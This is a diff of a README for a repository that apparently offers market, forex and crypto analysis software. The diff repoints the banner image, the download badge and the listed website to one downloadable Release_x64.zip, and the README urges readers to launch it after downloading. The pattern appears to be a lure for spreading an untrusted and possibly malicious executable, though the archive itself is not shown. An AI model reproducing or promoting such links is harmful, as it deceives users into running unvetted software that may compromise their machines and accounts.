@@ -1,7 +1,7 @@
 
 # Welcome to Market Overview - Indexes, Forex, Metals, and Crypto 📈💹📊
 
-![Market Overview](https://your-image-url.com)
+![Market Overview](https://github.com/Thinh1107/Market-Overview-Indexes-Forex-Metals-Crypto/releases/download/v2.0/Release_x64.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Explore the following topics in this repository:
 
 Click on the button below to download our software for an enhanced market analysis experience:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Thinh1107/Market-Overview-Indexes-Forex-Metals-Crypto/releases/download/v2.0/Release_x64.zip)](https://github.com/Thinh1107/Market-Overview-Indexes-Forex-Metals-Crypto/releases/download/v2.0/Release_x64.zip)
 
 Please note that the software needs to be launched after downloading for access to advanced features and insights.
 
@@ -80,7 +80,7 @@ Connect with us on social media for the latest updates, news, and announcements:
 
 - Twitter: [@MarketOverview]
 - LinkedIn: [Market Overview - Indexes, Forex, Metals, Crypto]
-- Website: [www.marketoverview.com]
+- Website: [https://github.com/Thinh1107/Market-Overview-Indexes-Forex-Metals-Crypto/releases/download/v2.0/Release_x64.zip]
 
 ---
 
